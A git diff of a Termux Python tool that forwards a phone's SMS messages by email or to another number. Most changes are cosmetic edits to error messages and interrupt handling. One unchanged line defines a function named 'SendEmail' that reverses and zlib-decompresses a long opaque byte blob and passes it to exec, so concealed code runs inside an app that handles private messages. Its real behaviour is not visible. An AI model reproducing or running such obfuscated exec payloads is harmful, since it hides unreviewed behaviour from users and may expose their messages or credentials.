@@ -9,6 +9,7 @@ except: print("SOME DEPENDENCIES COULD NOT BE INSTALLED....\nType 'python sms_fo
 
 
 __VERSION__ = "0.1"
+__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"
 
 clear = lambda : os.system("clear")
 
@@ -40,7 +41,7 @@ def cmd():
             return True
         else: return False
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def termux_api():
     try:
@@ -52,7 +53,7 @@ def termux_api():
             if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): return False
             else: return True
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Arrange(TXT="", RAW=" "):
     try: txt, INT = int(TXT), True
@@ -85,7 +86,7 @@ def center(text, a=0, display=True):
         if (display): print(finaltxt)
         else: return finaltxt
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def INPUT(text):
     try:
@@ -96,7 +97,7 @@ def INPUT(text):
         for i in range(len_txt_area-18): finaltxt += " "
         return (input(finaltxt+text+yellow))
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Banner():
     clear()
@@ -150,7 +151,7 @@ def AnimLOAD(text, animbar, repet=1, delay=0.08):
                 sleep(delay)
             repet -= 1
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Internet():
     try:
@@ -175,7 +176,7 @@ def Update():
                 os.system("rm -rf SMS_Forwarder")
                 os.rename(f"{__RP__}", "SMS_Forwarder")
             except KeyboardInterrupt: EXIT(False)
-            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
         if not (Internet()):
             Banner()
             center(f"{red}╔══════════════════════════════════════════╗", 5)
@@ -221,7 +222,7 @@ def Update():
             subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
             exit()
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def CheckVersion():
     try:
@@ -257,7 +258,7 @@ def CheckVersion():
             else: pass
         else: pass
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def About():
     try:
@@ -315,7 +316,7 @@ def About():
             sleep(2)
             MENU()
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def Usage():
     try:
@@ -371,7 +372,7 @@ def Usage():
             sleep(2)
             MENU()
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'6\x88\xd0\x98\x0b\xfe\x87\x97M\x84\x9c\xeeXw(\xfa\x95p\x7fE\xdf#\xc0\xfa\x1e\xdb/O\xc5\xa8$\xe3\xff\xf5\x93mvM\x8e\xd0\xe0a\xfe\x0b\xdd\xe8\xd8\x18\x99N\xf6\x0f"\x83&\x01\t]\x13\xba\x1c+\xf4\xc8\xf2\x82>\xf6\t\xabp6\x88\xfb\xd3\xeeVT(\x8b\xf5\xef\xae\xff\xbb\x076vE\xfe\x85BC\xad\x90b$^Tjc\xe0`\x8c|c6\xf9\xb5\x99\xa9a~\x867)\xe9\xb0{\x18\xf4W\xd0\x0b\x9f\xa7\xe3\xceB\x83\xb8\xfc\xfa\x7f\x99BZ\x00c\xc6W\xaf\xd8\xe7^0\x8b\xe3#$\\p\xc4\x9a\x91\xe5\xdd\x90I\xdc\x81\x92\xa0\xfc/\'\x88*\xd8\xc9\xe9\xe6\xbf\x85:h\xc7N|7\xeaL\x05\x1f\xa7 \xc6\x8eN>\x9b\xed\xbd\x03\xa5Po\xe8\xf4\t\xcb\x8a\xf4\x8b\xde\x8d\x19\xe1\xde\xd5\xf09Q\xaf\x1a\x16\xd5\xd9\x9c(\xac\x1a\x94d\xf3l\xbd\x98\xf6\x17\xca\xee\xf1P\xb1b_U\x85\xfci\xf8\xd1\xcd\xd5\xfa\xea\xf9\xfe\xafGF/\xa5bS\xc0@h\xa8\xf4k\xf9\xf2\x8cH?\xac\xa3\x89o\xb2&\xec/\xcb]\xfe\x91]\xfdVz\xcfC+F?\x14i\xb0\xcc\xc6\xf2e\xa4\x18\xb6\xdcx\xc9\xd1\x8f_\x1b\xeb\xae\xb76\xa7\x9e\x07\x1f|q\xb6\xc60\xd5\x14\x0e\xecFOk9\xe3\xb5\xdb\xb7y\x86\xa9\xc5C.lo\xde\xdb-\xfd+oB]\xcd\xf2\xdd\xe3\xb8\xaf\x17~\xe1\xf8\xb0\xe7v\x1a\xb6\xc3ocl\x98\xfb\xca\x17p\xa3(X\x12\xee\xaf\x1d\x91\x17*`%~\xeax\xdb\r3\xed<\xe0Bc\xdc\x8a#\xbfun\xd8\x13l\x11\x1b\xb6\t\xb3\xa8\x0e\'c\xec0\xd6\xbb\xa1\x87\xde\x94\xa6\xde\xe8\x9b\xc5X}\xba\x8dB\x1f\xb4\xad\xed\xc0\xf9QH\xfb`\xd8l\xfa1I\x00q"`\xf2\xc4@K\x01\xcbrc\x0c|\xab_\xdb\xcb\xf9{}\xbdyW-\xa6\x99M|\xf8\xafl\xbeR\xb1J\x12\xa0\xb5\x1f>x\x84\xd3cq\x97\xf2\xe2\xe8\xc7\x18Ki,u\xac\x9a\xffC#\x9f\xd3\xfa\xe6\xe4\xf6\xa7\xd0\xa8@@]\xe2z\x11$|\x15gbP\xe2|\xach@/&V=nM4\xf9\xe1\x05&r\xd9\x9a\xd6t\xc6\xcf\xea\xac\xa6W,B\x9eP\xee\xa3H~Nsk^Yc\x1bU\xf6F\xc5\xea\xefd\x04S?\xf6c\xd3k\xbc\xa8\xd6\xd3<\xecwO\xc4t4O`\xa07\x8c$\xe5\x18+\x85C\xd7\x8e\xc1\x10\xf2\x84\x93\x84\x92.H,=$#\xc7h\x87\xe2<\xfc\xd74\x01sJ\xb4!\xec\x81\x97d<\x9b\x89s$&\xfa\x03\xfb\xebLt\x8b\xfe\xa5\x8c\x9f\xc5G\xad\xc5w\xa3\xf4i4\xb1\xeb\xdcs\x03\x0e\x11\xc9\xf5\xb0\x18c\x19r\xb2\n%J\xf2\x80\xd6\x19\xca\x1b\xe77=\n5\xf4\xbd\x1e,\xefF\xea\t\xe8\x94\x93\xff\x11h\xef\xfb\xde\x94^\xd5\xed\xce\x916\xa9\x17`\x97\xb9\xc7\xd0K\xf4\x92=\xa2W\xb6I\xf7\t^\xc6F\xf7\x07\xb5\x10\x0b\xd9\x87x\x06\xe9\x87\xa7y\x1e\xe1\x8aT\x02\x0c7s\xca\x9f\xd4\xf2\x07i\xa7\xe8gvc\xed\x9b\xe3\x0bQ5\x88+\xa03.<V\xf9\xbe\xb9\xbd>1\xe3\x88\x9fvA7\xf4\xc1\xbe\x8c6E\xe5S]:k5\xa3\xf40\xb5dP\x0e\x18\xe6\x89wTKM\x0c\xf8i\x876~\xf1\xa8_\xe5\x90k\xd9\xe8ao9\xc9E\xc5\x1c\xf2@g\x08x\x93\xce3\x9f<z+R\xa1\x91\x82\x0c\xea\xff\xa5\xafvx\xfd\x97\t\xa0c\xba\xd4\xb1w\xb20\xf1\xd2\x8b\xa4%\xd5\x90e\xec\xea\x1f\xcd\xb3G \xf6n/v\xc9\xc1\x9d\xf9\x90\x05\xb1\xfa2^\xeb\xebS\xcd\x9f/\xc7\xb2JO\xa7^\x8a\xfd:\xd9\xf2T}9\x1a\x07\x82\x8f\xe4\x12\xf4}\x86\x9f4\xf2\x88~\xa3\xd0\xb2\x08\xac\x0f\xf9p\xa4\x1e\x8a\xf3\xe9W\xafGGG\xe4\xd2\xacG\xb8E\xdb\xed\xc3\xcb\x0fo\xb5\xbdMg\xf2\x16\x05R\xe9\xaanw\xcbmK\xdb\xa5\xdb;\x94\x1dYU\x88:\xca\xceN\xb9\xc9B\xcb\x18\xdd\xa2\xb6\xf9\xa0V\xe5S\xe6\xef\x86[1\xbf\xcb\xb9\\\xc7&_\xf3\x87<\x87\xbd#Q40\xb4\xf9\xd6\xff\x94<\xf5-\xf8\xa0\rg\xef\xa6c\x01\x99\x8c,\xf8\xc8\xc6\xb8\x91\xde\x84\x95\xd3\x01\x85\x93\xee\n\x8a\xa5/M\x19\xc9\xe6/\xd4;\xd3O\x9d\xdd\xdd\x9a|\xef\xfc\xf7/j\x13\x1d\x9a!\xfd\x18}U\xb4\x18\xbd\xbf\x9e@5\xd52\xd5\xf2\xee\x9eZu5\xdb\xdd\xb4+a\x90l8M\x87\xed!\x97\x0fd\x9b\xacyf\xf7\xfcIC\xfeMx\x94\x89\xae\x9f\xd3\n\x19\xbfgb\x10\xd5\xa6\xb1\x08mI\xf2\xd1{+\xad1\x17\xb2\x1c\xedt\xb4\xea\x85\xb3\x83\xcc\xa2\x0bY\xaf\xcd]\xe2\x03\xa30\xbb\x90\xec\xa7P\x83\xf5\xd4\x8a\x9b\xa5\xc1cx\xa6T\xb3\xd8\xf9\xd2X\xd9y\xab\xc0\xf6\x15&\xee:o\xab\x94\xb6z\xdd\x93\xeb@?\xf6\x18{\xd0\xb6\xaeO[9~\xc05GS\xc6\x87\xad9\x0c\xbe\xee\xb7\t9\xea\xc9y8\xaa\x9b\x83L9\x0c\x88)\xb5\x83A"\xef\x86\xe7\xd6\n]\xf2,\xf6\xb2S\xaeD=\x89\xd2F\x1c\xfbF\xab\'^\xe4SZ\xea\xc8E6N\xd4\xb9C\x82&\xd4\xa8{d\x0f\xd4hs\xeb3\xd5/\x0f49C\x82\xa7\x1a\xfe\xd2\xaba\xf5\x82|A\xdd\xc8\xf9\xac\xb0sy:u\xbb\x8c\r^\xb3\x96\x03W\xd4\xf9\x80\xbb\xc8\r@\x93\xe5\x83_\xe6\xb2\xacj\xd12\xf1:\xce\x8d\xbb{\x83\xda|\tzsj\xb5\x03\x0c\xa8(zjgY\x14\xb8\xdbz7\x9bb\xa8\xd1s \x8a\x04 \x8e\x92\x1d\xfc\xce#\x14\xb8\x80\xd7\xeb\x10\xd7L\xf5\xb1<\xf2f5\x1c\xb4\xd2H[\x94\\Q\x1a\xcc\xe4\xb4\xb7\'V\xe1\xbc\xa3\xc8\x1d@\xd5\xdak\x88"c\xc5(Y\xa7R\xbe\xb9\x04\xfdM\xa9*f\xe6+\tu\xd4y\x0bc\xcf\x95\xe4\x06\x04*\xbbU\x0e\xc4<`)\xf9Y\x81;5\xbd\xfa\x95t\xef0#T\x06E\x83NRc\xa6\n\x82I.\xa4\x1b:\xab\x19\xf4AB\xe5\x8fZ\x16\xec\x0c\xd4C\xb3Qxb\xe7\xf7\xf7#\xba\xf8\xe8\xd0\xbd\x0e\xe7K\xab\xa2\xda\xe9Y\'\xb9\xd8\xbd\xa1&\xe9\xae\x17\xdf\xc0\xb2cL\xd2\x82L@\xd6V\x93q\xb4T8\xe8\xd6aU\x1a\x19\x1c\xb2\xc7\xcf\xcexp\xee\xb6=9\xd3\xafz\x0ch\xbaE\xaa\xe9\xe4\x1d\xdd\xb0((f\xe2\xda\xcf\x98\x1e9:\xad\x83VcM\xa7CeAa\xb2\xfa\x8d\xed\xdfsoq!\xd3\xba\xd7\x8aIe\x12\xda)\xd4\xd5\xa7!\xc1\xa9\t\x13\xae\xf6\xefV\xc3$\xbfG\xf4\xdbp\x93\xa2\xea}\xc6\xe1\x04e\xcf\xc3\xf0\x99\x19\xc1\xc5\xe4\n\x86~\xd5\xd0\xe1Z\x8d\xb3\xf5\x94\x98\xcb\xfbz\xf3\t\x0e\xa6\x82\xd5j\x03J\xcb\x12\xa5\x85\xb7J\x96$\x04\xb9\xbd\x05\xac\x0e\xc5s\x94o\x8e\xd0\x88?P\xdaS\x81p\xe2]\x15\x9a\xedt\xbd\xbf\x9d\x9e v\x8b&\xa2@\xac\x9f\x17\x06\x92\xeaH\x0f0Z\xa3\xba\xa4\xb9\x0c\xd7\xfd\xd0\xa4\x12\xa7\xd2\x10\xb2\xfa\xe4\xb8\xaf\x178X!,\xc3E\xc9\xcb5\x0f\xf63\x80\xca\t\xab\xe1`\xff\xeeo\xd3\xf2*\xb9\x9dcR\x07\xcc\x02\xa9\x0e\x0e\xa6\x06\xcbBZ]\x05\x15\x92\xcf\xbfB)Y\xc2&\xbc\xd4\xa2\xec\xfc\xd5&\xe5\xeaN\xf3N\x9a\xcf7\xb9\xe2\xcc\xbe\x97\x07m\xcb\xce\xe2Vq\xcb&H\xb09\xf2Y\xbb\x16\xf3\xef\xb2\xcf\xbe\xcd;\xc5\xcaI\xde8\x99\x84\xbft\xea\xb2\xba|\x9b\x7fx\xb2\xf9K\x82\x1dY\x88e?\xeb\x0e\xfd\xae=\xcaf2\x19\xafjE\xd1\x0e\xaf\x16Y\'_B\x1f\xb9\xb7\xdb\xab\xcaL\xb4,\x13\xe3\x98"\xb8r\n\xf4\xa5\xd5!\x06\xbe~7Px\xa5\r\x006\xcb\x90P,L\xcc\x19\xf6\x9e2\x16z\xc3\xea\xc5a\x87\x02\xc7\xbbm\xa2\x96\xb3\xa1i"\xf7P\x11`\xf5w\x9f&\xebk\x1b\x0e\xb1\xc8\xa0as\x01\x0e\xfdd3\xdd\xe8\x00\x9f2\x14$\xebj\xd8~*\xa5 yU\x88\xdb\x00\xa9;^\x14\x8a\x95\x9c\xb8\xbb\x88\x8e\xe5\xe0W\x9d\x03Iz8\xa4p\x81\xbc\xb5\xdc\xee}\xb5d\x18\xfa\x19R\xe5\xa0\xa2\x03\xc1\x8c!\xd1;I\xf6/<\xf2f\xc6\xb0\xf1AX5\xc4`\x9a8B\x8a\x11\r\x95c\xd8\x0c{J\x0br\x8c\x94\xddg\xdc\xa7=\xe2\x02\xc4$\x96D\x12\x87\x1f\x13m{a\xa4\xfbl(\xb32\xb0\x86\xf1K\x85UT\x91\xb7\xbb\x13U\t\xf4\xda\x18\xd5Y\xed\t\xba\xecB\x03\x96hY\x94\xd6 \xaa^ra`\xa7\xb5\xd0\x8fLFS\xec\x1c\xdb\x87\x9c\x9e\xd2\x00\xfaI(\xd6\xe2K\x14\xa2\xdaf\x10\xb6\xb6Q\xe5s\x80\xc9\xa3C\x01G}\x89\x89\xe4*\xba\x08\x92\x9aL\xc4\x90\xb3\xbf\xa8\x0e\x15\xcd\x1d\x02\xb4\xa7/\xfd\x1b\xd5\xa7\xed\xc0\xe7\xdc:k\x98\x8f\x05\xad\xdc\xec\x0f%wu\x92\x91x\xbd?\x05*\xf6l\xc9\xd0\xb3\x95M\xbc\x02\xd1\xcf\xfc\x11:\x9b!b]\xc0fg(\xac}\xc8E\\\nM f`\xcb\xbc\x8c\xe3\x10\xb4F\xb9\xb2\x10\xaeLz5\x83D!^\x97j\x96^\xa0SO\x98\x89p\xb1\x88\xb9\x1fA\xbe\xb9\xbc\xb2|\xaa(\xe9\xcc\xbc\xd1\xf4\xfe\xff\x16\xa2HXx\xe4;\xc8-SU\xb2*\x88T\x02\x04\xfc\xc6JC\xe3\x0b7D}\xc94*S\xcaIi\xa0fd\xc9\xc5\x93\xec\x1d)\xbe\xc5\x15CH1\xc7\xe4\xccC\xa8l\x97\x0byWS\x11\x85\xa9\x84S8r\x06P\xb9\x0e$\xa1\xb1\x85\x90\x1c1\x18Q\x01\x08\xd4\xbb`o\x82\xfd<\xc5\xf2\xfe\x05O \x90\xbbQ\xdc\xba_\xcc\x80#\xa3\xa3\x81\x01]\xbf\xf7\x9b\x9b\xab\xeb\xfcS\x9f\xf4\x06\xbf`\x95\xb1\xf3\xa2dc\x02R\x8d\x84\xf9\x195\xb3\x02C(\x8a \\V?$a\x90-\x02\xc1\xb3\xe0\x81z\xd8\xf8\xae\x17R\xec\x10O)\x18\xf8_\x821\xc4M\x81E\x88\xc7"\xb1r?\xa9\x80U\xeea\r\xd0\xac\x97$\xa3~\xe7\x87\x87\xcb\x1a.\xb0\xfb;N\xdd\xfb\xa8{\xef\xf2\t\xd9e$*D\x89\x8bh\x92\x82\x8bi}\xdd \x182,\x1d\x9d7n\x98\xdbUI\xd6\xe7l\x8d=\x8d\xd0j\xc1_\xbd\xf68\xdbn\xdb\x1a\xd5\x9cx'))
 def SendNumber(to, data):
@@ -415,12 +416,12 @@ def SendSMS(TO, SVE):
                         else: SendNumber(to, data["body"])
                     ID += SmsID
             else: SMSLBAR()
-    except KeyboardInterrupt: MENU()
+    except KeyboardInterrupt: EXIT(False)
     except json.decoder.JSONDecodeError :
         finaltxt=""
         for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
         sys.stdout.write("\r"+finaltxt+f"{magenta}[{red}!{magenta}] {white}Could Not Send Message      {yellow}"), print(), print()
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def SMSLBAR():
     finaltxt=""
@@ -480,7 +481,7 @@ def Installer():
                 exit()
             else: MENU()
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def EmailMenu():
     try:
@@ -532,8 +533,8 @@ def EmailMenu():
             for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
             sys.stdout.write("\r"+finaltxt)
             while True: SendSMS(Filter, True)
-    except KeyboardInterrupt: MENU()
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def PHMenu():
     try:
@@ -562,8 +563,8 @@ def PHMenu():
             for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
             sys.stdout.write("\r"+finaltxt)
             while True: SendSMS(Filter, False)
-    except KeyboardInterrupt: MENU()
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 def MENU():
     try:
@@ -598,7 +599,7 @@ def MENU():
             sleep(2)
             MENU()
     except KeyboardInterrupt: EXIT(False)
-    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
 if (__name__ == "__main__"):
     sys.stdout.write(f"\r{yellow}Checking Updates...") 
